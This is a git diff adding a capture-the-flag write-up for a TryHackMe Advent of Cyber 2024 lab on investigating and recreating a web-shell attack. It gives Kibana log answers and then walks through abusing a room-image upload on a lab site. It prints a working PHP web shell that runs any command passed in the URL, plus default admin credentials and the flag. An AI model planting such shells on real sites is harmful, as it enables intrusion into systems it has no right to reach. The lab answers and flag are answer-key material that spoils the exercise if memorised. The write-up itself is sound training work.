@@ -174,3 +174,135 @@ Set the event.category filter to authentication and event.outcome to failure.
 *Install-WindowsUpdate -AcceptAll -AutoReboot*
 
 ![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/26.png)
+
+
+# **Day 3: Even if I wanted to go, their vulnerabilities wouldn't allow it.**
+
+After reading the explanition and the walkthrough let's move to the practical part:
+
+Practical
+Your task today is two-fold. First, you must access Kibana on MACHINE_IP:5601 to investigate the attack and answer the blue questions below.
+Then, you will proceed to Frosty Pines Resort's website at `http://frostypines.thm`
+and recreate the attack to answer the red questions and inform the developers what element of the website was vulnerable.
+
+Please note, to access `http://frostypines.thm`, you will need to reference it within your hosts file. On the AttackBox, this can be done by executing the following command in a terminal: 
+
+```bash
+echo "10.10.53.42 frostypines.thm" >> /etc/hosts
+```
+
+If you do not see an IP address (i.e. 10.10.x.x) and only MACHINE IP, ensure that you have started the target machine by pressing on the green "Start Machine" button further up the task, within the heading "Connecting to the Machine".
+
+To review the logs of the attack on Frosty Pines Resorts, make sure you select the "`frostypines-resorts`" collection within ELK. Such as below:
+
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/29.png)
+
+The date and time that you will need to use when reviewing logs will be between **11:30 and 12:00 on October 3rd 2024.**
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/30.png)
+
+emember, to access the Frosty Pines Resorts website `(http://frostypines.thm)`, you will need to reference it in your hosts file. On the AttackBox, this can be done by executing the following command in a terminal: `echo "10.10.53.42 frostypines.thm" >> /etc/hosts`
+
+# **Answer the questions below**
+
+**BLUE:** Where was the web shell uploaded to?
+
+*Answer format: /directory/directory/directory/filename.php*
+
+**Ans**: *media/images/rooms/shell.php*
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/28.png)
+
+**BLUE**: What IP address accessed the web shell?
+
+*10.11.83.34*
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/31.png)
+
+**RED**: What is the contents of the flag.txt?
+
+**Steps**
+
+Add an entry to `/etc/hosts` by associating your machine's IP with frostypines.thm.
+
+```bash
+echo "10.10.53.42 frostypines.thm" >> /etc/hosts
+```
+
+then, let's open `http://frostypines.thm` and Click on the `reservation` Tab
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/32.png)
+
+Log in using the provided credentials:
+
+```c
+Username: admin@frostypines.thm
+Password: admin
+```
+
+Once logged in, visit the admin panel at `http://frostypines.thm/admin/index.php`.
+
+Select the `Add New Room` option.
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/33.png)
+
+Save the PHP code below with a filename of your choice, exploit.php.
+
+```bash
+nano exploit.php
+```
+
+```php
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="text" name="command" autofocus id="command" size="50">
+<input type="submit" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['command'])) 
+    {
+        system($_GET['command'] . ' 2>&1'); 
+    }
+?>
+</pre>
+</body>
+</html>
+```
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/34.png)
+
+let's upload our exploit.php file..
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/35.png)
+
+then we click add room..
+
+After that we see that the romm has been added in the last row, right click on the image and open in new tap..
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/36.png)
+
+we will get this shell input filed:
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/37.png)
+
+let's make sure that our exploitation is working by writing a shell command like `ls` or `whoami`
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/38.png)
+
+let's use `ls` command to list the directory files..
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/39.png)
+
+last step let's use `cat` command to catch the content of the flag.txt file..
+
+```bash
+cat flag.txt
+```
+
+![Screenshot](/assets/img/Advent%20Of%20Cyber%202024/40.png)
+
+*THM{Gl1tch_Was_H3r3}*
+
+see u in day 4 bro `:)`
